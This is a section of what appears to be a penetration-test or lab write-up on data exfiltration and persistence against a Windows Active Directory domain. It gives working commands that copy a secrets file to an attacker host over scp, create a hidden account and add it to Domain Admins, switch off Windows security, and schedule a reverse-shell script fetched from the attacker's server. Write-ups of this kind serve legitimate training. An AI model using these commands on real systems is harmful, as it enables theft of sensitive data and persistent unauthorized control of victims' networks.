### Data Exfiltration & Persistence

#### **Data Exfiltration**
Once we gained access, we identified a file named `secrets.txt`. To securely transfer this file without leaving significant traces, we used the Secure Copy Protocol (SCP) to copy it from the compromised machine to the attacker's machine over SSH.

**On the Windows machine:**
```powershell
scp ".\secrets.txt" attacker@10.0.0.50:/home/attacker/my_sensitive_file.txt
```
After entering the attacker’s password, the file is successfully transferred to the attacker's machine.

---
#### **Persistence**
To maintain long-term access to the compromised environment, we create a backdoor account with administrative privileges on the Domain Controller.

**On the Windows Domain Controller (PowerShell):**
```powershell
net user project-x-user @mysecurepassword /add
```
To escalate privileges and blend in with legitimate users, we modify the account:
```powershell
net user project-x-user @mysecurepassword1! /add
net localgroup Administrators project-x-user /add
net group "Domain Admins" project-x-user /add
```

---
#### **Reverse Shell for Remote Access**
To maintain remote access, we create a reverse shell on the Active Directory server.

1. **Download Reverse Shell Script**
   - Open a browser on the compromised Windows machine and navigate to the attacker’s machine:
   - `http://10.0.0.50:8000`
   - Download `reverse.ps1` from the attacker's hosted server.
   - Save the script in:
     ```plaintext
     C:\Users\Administrator\AppData\Local\Microsoft\Windows\
     ```

2. **Disable Security Protections**
   - Turn off all device protection under Windows security settings.

3. **Create a Scheduled Task for Persistence**
   - Open PowerShell and execute the following command to schedule execution of the reverse shell script:
   ```powershell
   schtasks /create /tn "Persistence Task" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1" /sc daily /st 00:00
   ```
   - This ensures the script runs at a set time, allowing the attacker to regain access whenever needed.

Once the scheduled task triggers, the attacker receives a remote connection back, enabling them to maintain access without needing to re-exploit vulnerabilities.

This concludes **Data Exfiltration & Persistence**.

